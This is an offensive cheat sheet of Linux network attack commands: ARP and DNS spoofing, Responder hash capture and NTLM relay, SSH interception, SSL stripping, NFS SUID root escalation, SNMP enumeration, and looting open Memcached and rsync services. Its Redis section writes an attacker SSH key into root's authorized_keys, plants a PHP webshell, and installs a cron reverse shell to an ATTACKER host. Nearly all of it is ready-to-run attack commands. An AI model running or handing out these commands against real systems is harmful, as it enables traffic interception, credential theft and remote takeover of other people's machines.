# Linux Network Attack Reference

## ARP Spoofing / MitM

```bash
# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# arpspoof (dsniff)
arpspoof -i eth0 -t TARGET_IP GATEWAY_IP
arpspoof -i eth0 -t GATEWAY_IP TARGET_IP  # run in second terminal

# ettercap
ettercap -T -q -i eth0 -M arp:remote /TARGET_IP// /GATEWAY_IP//

# bettercap
bettercap -iface eth0
> net.probe on
> set arp.spoof.targets TARGET_IP
> arp.spoof on
> net.sniff on
```

## DNS Spoofing

```bash
# bettercap DNS spoof
bettercap -iface eth0
> set dns.spoof.domains target.com,*.target.com
> set dns.spoof.address ATTACKER_IP
> dns.spoof on

# ettercap (etter.dns file)
echo "target.com A ATTACKER_IP" >> /etc/ettercap/etter.dns
echo "*.target.com A ATTACKER_IP" >> /etc/ettercap/etter.dns
ettercap -T -q -i eth0 -P dns_spoof -M arp:remote /TARGET_IP// /GATEWAY_IP//

# dnschef (standalone)
dnschef --fakeip ATTACKER_IP --fakedomains target.com -i 0.0.0.0
```

## LLMNR / NBT-NS / mDNS Poisoning

```bash
# Responder (captures NTLMv2 hashes)
responder -I eth0 -rdwv

# Responder with WPAD
responder -I eth0 -rdwv -b -F

# Crack captured hashes
hashcat -m 5600 hashes.txt rockyou.txt    # NTLMv2
john --format=netntlmv2 hashes.txt

# Relay instead of crack (ntlmrelayx)
ntlmrelayx.py -tf targets.txt -smb2support
```

## SSH MitM

```bash
# ssh-mitm (transparent SSH proxy)
pip install ssh-mitm
ssh-mitm server --remote-host TARGET_IP

# Redirect traffic to ssh-mitm via iptables
iptables -t nat -A PREROUTING -p tcp --dport 22 -j REDIRECT --to-port 10022
```

## SSL/TLS Stripping

```bash
# sslstrip (downgrade HTTPS to HTTP)
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
sslstrip -l 10000

# bettercap
bettercap -iface eth0
> set http.proxy.sslstrip true
> http.proxy on
> arp.spoof on
> net.sniff on

# mitmproxy (transparent mode)
iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8080
mitmproxy --mode transparent --showhost
```

---

## NFS Exploitation

```bash
# Enumerate NFS shares
showmount -e TARGET_IP

# Mount share
mkdir /mnt/nfs
mount -t nfs TARGET_IP:/share /mnt/nfs

# If no_root_squash is set:
# Root on your machine = root on NFS
# Create SUID binary:
cp /bin/bash /mnt/nfs/rootbash
chmod +s /mnt/nfs/rootbash
# On target: /share/rootbash -p

# NFS UID spoofing (any user)
# Create user with target UID locally:
useradd -u TARGET_UID nfsuser
su nfsuser
ls /mnt/nfs/  # now have target user's access
```

## SNMP Exploitation

```bash
# Default community strings
onesixtyone -c /usr/share/wordlists/community_strings.txt TARGET_IP

# Enumerate with found community string
snmpwalk -v2c -c public TARGET_IP
snmpwalk -v2c -c public TARGET_IP 1.3.6.1.2.1.25.4.2.1.2  # running processes
snmpwalk -v2c -c public TARGET_IP 1.3.6.1.4.1.77.1.2.25    # user accounts
snmpwalk -v2c -c public TARGET_IP 1.3.6.1.2.1.6.13.1.3     # TCP connections

# SNMP RW community → RCE
snmpset -v2c -c private TARGET_IP 1.3.6.1.2.1.1.6.0 s "test"
# If writable, can potentially modify system config
```

## Redis Unauthenticated

```bash
# Check for no-auth Redis (default port 6379)
redis-cli -h TARGET_IP ping
# If "PONG" → unauthenticated

# Dump all keys
redis-cli -h TARGET_IP KEYS '*'
redis-cli -h TARGET_IP GET <key>

# SSH key injection
ssh-keygen -t rsa -f /tmp/redis_key -N ''
(echo -e "\n\n"; cat /tmp/redis_key.pub; echo -e "\n\n") > /tmp/foo.txt
redis-cli -h TARGET_IP flushall
cat /tmp/foo.txt | redis-cli -h TARGET_IP -x set crackit
redis-cli -h TARGET_IP config set dir /root/.ssh/
redis-cli -h TARGET_IP config set dbfilename "authorized_keys"
redis-cli -h TARGET_IP save

# Webshell via Redis
redis-cli -h TARGET_IP config set dir /var/www/html/
redis-cli -h TARGET_IP config set dbfilename "shell.php"
redis-cli -h TARGET_IP set payload '<?php system($_GET["cmd"]); ?>'
redis-cli -h TARGET_IP save

# Cron job via Redis (reverse shell)
redis-cli -h TARGET_IP config set dir /var/spool/cron/crontabs/
redis-cli -h TARGET_IP config set dbfilename root
redis-cli -h TARGET_IP set payload "\n\n*/1 * * * * bash -i >& /dev/tcp/ATTACKER/4444 0>&1\n\n"
redis-cli -h TARGET_IP save
```

## Memcached

```bash
# Dump all keys (port 11211)
echo "stats items" | nc TARGET_IP 11211
echo "stats cachedump 1 100" | nc TARGET_IP 11211
echo "get <key>" | nc TARGET_IP 11211

# memcdump tool
memcdump --servers=TARGET_IP
memccat --servers=TARGET_IP <key>
```

## Rsync Open

```bash
# List modules
rsync --list-only rsync://TARGET_IP/

# Download files
rsync -av rsync://TARGET_IP/module/ /tmp/rsync_loot/

# Upload (if writable)
rsync -av /tmp/payload rsync://TARGET_IP/module/
```
